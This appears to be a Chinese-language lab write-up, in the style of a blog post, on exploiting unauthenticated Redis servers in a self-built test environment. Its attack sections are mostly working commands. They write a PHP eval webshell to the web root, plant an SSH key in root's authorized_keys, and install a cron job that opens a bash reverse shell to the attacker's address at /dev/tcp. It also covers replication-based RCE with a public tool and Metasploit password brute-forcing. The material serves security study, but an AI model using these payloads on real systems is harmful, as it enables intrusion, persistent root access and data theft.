# Redis未授权漏洞

接下来准备整理一下所有常见和不常见的各种未授权登录问题，有补充的和指正的问题请各位佬们好好教一教

### 测试环境

靶机：kali ip 172.16.80.3

攻击机： Windows 11 家庭中文版 ip 192.168.1.101

### 靶机redis安装配置

    
    
    ┌──(wyp㉿WYP)-[~/桌面]
    └─$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz
    --2023-07-13 10:13:42--  http://download.redis.io/releases/redis-2.8.17.tar.gz
    正在解析主机 download.redis.io (download.redis.io)... 45.60.125.1
    正在连接 download.redis.io (download.redis.io)|45.60.125.1|:80... 已连接。
    已发出 HTTP 请求，正在等待回应... 200 OK
    长度：1234543 (1.2M) [application/octet-stream]
    正在保存至: “redis-2.8.17.tar.gz”
    
    redis-2.8.17.tar.gz           100%[=================================================>]   1.18M   264KB/s  用时 5.4s  
    
    2023-07-13 10:13:48 (222 KB/s) - 已保存 “redis-2.8.17.tar.gz” [1234543/1234543])
    
    
    ┌──(wyp㉿WYP)-[~/桌面]
    └─$ tar xzf redis-2.8.17.tar.gz                           
    
    ┌──(wyp㉿WYP)-[~/桌面]
    └─$ cd redis-2.8.17                                       
    
    ┌──(wyp㉿WYP)-[~/桌面/redis-2.8.17]
    └─$ cd src                                                
    
    ┌──(wyp㉿WYP)-[~/桌面/redis-2.8.17/src]
    └─$ sudo su root
    [sudo] wyp 的密码：
    ┌──(root㉿WYP)-[/home/wyp/桌面/redis-2.8.17/src]
    └─# make install

make的时候一道要用root，不然会失败

    
    
    ┌──(root㉿WYP)-[/home/wyp/桌面/redis-2.8.17/src]
    └─# cp redis-server /usr/bin  
    
    ┌──(root㉿WYP)-[/home/wyp/桌面/redis-2.8.17/src]
    └─# cp redis-cli /usr/bin
    
    ┌──(root㉿WYP)-[/home/wyp/桌面/redis-2.8.17/src]
    └─# ../
    
    ┌──(root㉿WYP)-[~/redis-2.8.17]
    └─# redis-server /etc/redis.conf
    [31673] 13 Jul 14:58:20.468 * Increased maximum number of open files to 10032 (it was originally set to 1024).
    [31673] 13 Jul 14:58:20.469 # Warning: 32 bit instance detected but no memory limit set. Setting 3 GB maxmemory limit with 'noeviction' policy now.
                    _._                                              
               _.-``__ ''-._                                         
          _.-``    `.  `_.  ''-._           Redis 2.8.17 (00000000/0) 32 bit
      .-`` .-‍‍```.  ‍‍```\/    _.,_ ''-._                               
     (    '      ,       .-`  | `,    )     Running in stand alone mode
     |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
     |    `-._   `._    /     _.-'    |     PID: 31673
      `-._    `-._  `-./  _.-'    _.-'                               
     |`-._`-._    `-.__.-'    _.-'_.-'|                              
     |    `-._`-._        _.-'_.-'    |           http://redis.io    
      `-._    `-._`-.__.-'_.-'    _.-'                               
     |`-._`-._    `-.__.-'    _.-'_.-'|                              
     |    `-._`-._        _.-'_.-'    |                              
      `-._    `-._`-.__.-'_.-'    _.-'                               
          `-._    `-.__.-'    _.-'                                   
              `-._        _.-'                                       
                  `-.__.-'                                           
    
    [31673] 13 Jul 14:58:20.470 # Server started, Redis version 2.8.17
    [31673] 13 Jul 14:58:20.470 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
    [31673] 13 Jul 14:58:20.470 * DB loaded from disk: 0.000 seconds
    [31673] 13 Jul 14:58:20.470 * The server is now ready to accept connections on port 6379

自此，靶机redis服务成功开启

### 攻击机连接redis靶机

![](./img/6089590320526282867.png)

    
    
    config get dir #查看redis数据库路径
    config set dir /root/redis-2.8.17# #修改靶机Redis数据库路径
    config set dbfilename shell.php #生成shell.php文件
    set xxx "\r\n\r\n<?php phpinfo();?>\r\n\r\n"#将一句话木马写入文件中
    #"\r\n\r\n"是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。
    set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"#上传木马可以通过蚁剑连接
    save#保存
    

![](./img/7562493425519793763.png)

![](./img/6518513106020029585.png)

### 利用前提

1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证

2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经）

    
    
    .还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）

## 利用redis漏洞ssh密钥连接

### ssh密钥连接

大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：

  1. 客户端生成RSA公钥和私钥
  2. 客户端将自己的公钥存放到服务器
  3. 客户端请求连接服务器，服务器将一个随机字符串发送给客户端
  4. 客户端根据自己的私钥加密这个随机字符串之后再发送给服务器
  5. 服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。

### 利用前提

1.当redis以root身份运行。

2.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。

3.存在/root/.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录，不过可能进不去root目录，权限问题可能，或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls
-la查看有没有。

### 密钥生成

终端输入之后有几个回车，点就行

    
    
    ssh-keygen -t rsa
    

![](./img/2336811930650662939.png)

![](./img/4563605026750429529.png)

生成密钥之后我们可以将公钥id_rsa.pub里面内容复制粘贴到key.txt文件中，再上传到靶机上面

    
    
    type key.txt | redis-cli.exe -h 192.168.43.141 -x set xxx#如果是linux 将type换成cat
    #将公钥作为value插入到数据库中，key随便啥值。
    redis-cli.exe -h 192.168.43.141 config set dir /root/.ssh
    #修改redis数据库路径
    redis-cli.exe -h 192.168.43.141 config set dbfilename authorized_keys
    #生成缓冲文件authorized_keys
    redis-cli.exe -h 192.168.43.141 save
    #保存
    ssh -i id_rsa root@192.168.43.141
    #连接
    

### 注意

  * 如果你是linux系统使用cat,是windows系统使用type.
  * 如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa root@192.168.43.141需要在.ssh目录下，因为权限问题。
  * 你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。
  * 文件名必须是authorized_keys,由配置文件决定的。

**实际操作下来，还是linux操作好一点，windows有点难受**

## 上传反弹shell命令

首先我们需要定位到我们需要的文件路径下，因为在/var/spool/cron/crontabs/下如果文件名是root，那么会定时执行里面的命令。这个目录不同操作系统是不一样我的是debain的。具体步骤如下：

    
    
    redis-cli.exe -h 192.168.43.141
    config set dir /var/spool/cron/crontabs
    config set dbfilename root
    set xxx "\n\n* * * * * /bin/bash -i>&/dev/tcp/192.168.43.102/8888 0>&1\n\n"
    #前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。
    save
    

可以看到成功上传反弹命令

解决redis crontab反弹shell失败  
当我们攻击机利用nc开启8888端口监听，一直没有收到反弹的shell,所以我进行了一下排查原因，也许你们也会需要同样情况

第一个：首先你要看一下你的cron启动没有，可以先查看状态如果是running,那就不用管，如果不是就需要启动一下，一般而言cron都是自启动的。所以一般来说不会是这个出问题。

    
    
    service crond restart重启service crond start启动
    service crond stop关闭service crond status查看状态
    

第二个：我发现我的cron启动了但是依然无法反弹shell,去找了资料知道利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。我们手动删除乱码发现反弹仍然失败，查看资料发现我们还需要关注以下问题。

第三个:root文件的权限必须为600也就是说是rw-----------
    
    
    chmod 600 root#修改root文件权限
    

第四个:我们反弹shell的/bin/sh是bash，而我的靶机的bin/sh是dash ,所以运行出错。我们需要通过以下命令查看和修改。

    
    
    ls -al /bin/sh查看运行环境ln -s -f bash /bin/sh修改为bash
    

当我们按照上述步骤修改完成可以看到反弹成功。但是ifconfig不能执行可以通过下面代码是的ifconfig成功执行。

    
    
    ln -s /usr/sbin/ifconfig /usr/bin/ifconfig
    

总结:计时任务反弹shell 如果是ubuntu和debian操作系统这个就没有办法利用成功，centos操作系统是可以的利用的

## 利用redis主从复制反弹shell

这里用到了一个工具 Redis-rce，github上有

![](./img/153787530691967279.png)

python redis-rce.py -r 192.168.3.231 -L 192.168.3.207 -f module.so  
靶机 攻击机  
运行以上命令，会让你选择，可以输入i,r,e分别对应交互式shell,反弹shell和退出。

注意：如果redis需要密码，可以加-a参数。

交互式

![](./img/7207960396931605661.png)

反弹shell

同时别忘了在攻击机上开启监听

![](./img/3459371586798420704.png)

## mfs redis密码破解

msf是kali自带的一个攻击工具

    
    
    msfdb run开启msf
    

![](./img/4798218208809015441.png)

search redis查看有关redis的模块

![](./img/2073890205741592074.png)

use 5#选择5号模块

show options #展示需要设置的参数

![](./img/7836617112371446714.png)

set RHOSTS IP #设置靶机的ip

run #运行模块

![](./img/8212420126298009271.png)

可以看到成功爆出密码，不过这个使用的是msf自带的密码字典，所以对于复杂密码就不行了，可以使用自己字典。可以使用编号为2的redis_server密码登录验证。可以使用编号为4的file_upload进行文件上传

